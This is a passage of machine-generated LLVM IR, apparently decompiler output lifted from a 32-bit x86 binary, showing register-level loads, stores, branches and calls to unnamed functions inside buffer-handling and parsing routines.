  %v1_8049325 = load i32, i32* @esp, align 4
  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_8051fb0()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_8051ca0()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054acb.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_8051ca0()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049496, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_80526c9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_805285e()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
